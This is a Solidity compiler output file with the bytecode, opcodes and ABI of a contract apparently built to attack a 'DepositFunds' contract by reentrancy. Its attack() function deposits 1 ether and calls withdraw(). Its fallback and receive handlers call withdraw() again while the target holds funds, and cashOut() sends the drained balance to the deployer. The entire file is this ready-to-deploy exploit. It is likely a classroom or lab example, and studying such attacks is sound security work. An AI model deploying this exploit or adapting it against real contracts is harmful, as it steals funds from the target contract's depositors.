{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b5060405161097c38038061097c833981810160405281019061003291906100ce565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b6000815190506100c881610132565b92915050565b6000602082840312156100e4576100e361012d565b5b60006100f2848285016100b9565b91505092915050565b60006101068261010d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61013b816100fb565b811461014657600080fd5b50565b610824806101586000396000f3fe6080604052600436106100435760003560e01c806312b5834914610228578063793cd71e146102535780639e5faafc1461025d578063e2c41dbc1461026757610138565b3661013857670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101365760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f657600080fd5b505af115801561010a573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906101339190610530565b50505b005b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106102265760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101e657600080fd5b505af11580156101fa573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906102239190610530565b50505b005b34801561023457600080fd5b5061023d610292565b60405161024a9190610608565b60405180910390f35b61025b61029a565b005b610265610312565b005b34801561027357600080fd5b5061027c610487565b60405161028991906105cd565b60405180910390f35b600047905090565b60006102a4610292565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f1935050505015801561030e573d6000803e3d6000fd5b5050565b670de0b6b3a764000034101561035d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610354906105e8565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103c557600080fd5b505af11580156103d9573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561044657600080fd5b505af115801561045a573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906104839190610530565b5050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006104be6104b984610648565b610623565b9050828152602081018484840111156104da576104d961078e565b5b6104e58482856106f6565b509392505050565b6000815190506104fc816107d7565b92915050565b600082601f83011261051757610516610789565b5b81516105278482602086016104ab565b91505092915050565b6000806040838503121561054757610546610798565b5b6000610555858286016104ed565b925050602083015167ffffffffffffffff81111561057657610575610793565b5b61058285828601610502565b9150509250929050565b610595816106c0565b82525050565b60006105a8601083610679565b91506105b3826107ae565b602082019050919050565b6105c7816106b6565b82525050565b60006020820190506105e2600083018461058c565b92915050565b600060208201905081810360008301526106018161059b565b9050919050565b600060208201905061061d60008301846105be565b92915050565b600061062d61063e565b90506106398282610729565b919050565b6000604051905090565b600067ffffffffffffffff8211156106635761066261075a565b5b61066c8261079d565b9050602081019050919050565b600082825260208201905092915050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006106cb826106d2565b9050919050565b60006106dd826106e4565b9050919050565b60006106ef82610696565b9050919050565b60005b838110156107145780820151818401526020810190506106f9565b83811115610723576000848401525b50505050565b6107328261079d565b810181811067ffffffffffffffff821117156107515761075061075a565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f456e76696172206d61732076616c6f7200000000000000000000000000000000600082015250565b6107e08161068a565b81146107eb57600080fd5b5056fea2646970667358221220123f674a0380493e23032604c8bc08b08701d933b993311220aae63b22b1a7c464736f6c63430008070033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x97C CODESIZE SUB DUP1 PUSH2 0x97C DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xCE JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x149 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xC8 DUP2 PUSH2 0x132 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE4 JUMPI PUSH2 0xE3 PUSH2 0x12D JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF2 DUP5 DUP3 DUP6 ADD PUSH2 0xB9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x106 DUP3 PUSH2 0x10D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x13B DUP2 PUSH2 0xFB JUMP JUMPDEST DUP2 EQ PUSH2 0x146 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x824 DUP1 PUSH2 0x158 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12B58349 EQ PUSH2 0x228 JUMPI DUP1 PUSH4 0x793CD71E EQ PUSH2 0x253 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x25D JUMPI DUP1 PUSH4 0xE2C41DBC EQ PUSH2 0x267 JUMPI PUSH2 0x138 JUMP JUMPDEST CALLDATASIZE PUSH2 0x138 JUMPI PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x136 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x133 SWAP2 SWAP1 PUSH2 0x530 JUMP JUMPDEST POP POP JUMPDEST STOP JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x226 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x223 SWAP2 SWAP1 PUSH2 0x530 JUMP JUMPDEST POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x234 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x23D PUSH2 0x292 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x24A SWAP2 SWAP1 PUSH2 0x608 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x25B PUSH2 0x29A JUMP JUMPDEST STOP JUMPDEST PUSH2 0x265 PUSH2 0x312 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x273 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x27C PUSH2 0x487 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x289 SWAP2 SWAP1 PUSH2 0x5CD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A4 PUSH2 0x292 JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC DUP3 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x30E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x35D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x354 SWAP1 PUSH2 0x5E8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3C5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3D9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x446 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x45A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x483 SWAP2 SWAP1 PUSH2 0x530 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4BE PUSH2 0x4B9 DUP5 PUSH2 0x648 JUMP JUMPDEST PUSH2 0x623 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x4DA JUMPI PUSH2 0x4D9 PUSH2 0x78E JUMP JUMPDEST JUMPDEST PUSH2 0x4E5 DUP5 DUP3 DUP6 PUSH2 0x6F6 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x4FC DUP2 PUSH2 0x7D7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x517 JUMPI PUSH2 0x516 PUSH2 0x789 JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH2 0x527 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x4AB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x547 JUMPI PUSH2 0x546 PUSH2 0x798 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x555 DUP6 DUP3 DUP7 ADD PUSH2 0x4ED JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x576 JUMPI PUSH2 0x575 PUSH2 0x793 JUMP JUMPDEST JUMPDEST PUSH2 0x582 DUP6 DUP3 DUP7 ADD PUSH2 0x502 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x595 DUP2 PUSH2 0x6C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5A8 PUSH1 0x10 DUP4 PUSH2 0x679 JUMP JUMPDEST SWAP2 POP PUSH2 0x5B3 DUP3 PUSH2 0x7AE JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5C7 DUP2 PUSH2 0x6B6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5E2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x58C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x601 DUP2 PUSH2 0x59B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x61D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x5BE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x62D PUSH2 0x63E JUMP JUMPDEST SWAP1 POP PUSH2 0x639 DUP3 DUP3 PUSH2 0x729 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x663 JUMPI PUSH2 0x662 PUSH2 0x75A JUMP JUMPDEST JUMPDEST PUSH2 0x66C DUP3 PUSH2 0x79D JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6CB DUP3 PUSH2 0x6D2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6DD DUP3 PUSH2 0x6E4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6EF DUP3 PUSH2 0x696 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x714 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x6F9 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x723 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x732 DUP3 PUSH2 0x79D JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x751 JUMPI PUSH2 0x750 PUSH2 0x75A JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x456E76696172206D61732076616C6F7200000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x7E0 DUP2 PUSH2 0x68A JUMP JUMPDEST DUP2 EQ PUSH2 0x7EB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SLT EXTCODEHASH PUSH8 0x4A0380493E230326 DIV 0xC8 0xBC ADDMOD 0xB0 DUP8 ADD 0xD9 CALLER 0xB9 SWAP4 BALANCE SLT KECCAK256 0xAA 0xE6 EXTCODESIZE 0x22 0xB1 0xA7 0xC4 PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "416800",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"": "infinite",
				"attack()": "infinite",
				"cashOut()": "infinite",
				"depositFunds()": "2641",
				"getTotalBalance()": "317"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"cashOut()": "793cd71e",
			"depositFunds()": "e2c41dbc",
			"getTotalBalance()": "12b58349"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address payable",
					"name": "_depositFundsAddress",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"stateMutability": "payable",
			"type": "fallback"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "cashOut",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "depositFunds",
			"outputs": [
				{
					"internalType": "contract DepositFunds",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "getTotalBalance",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}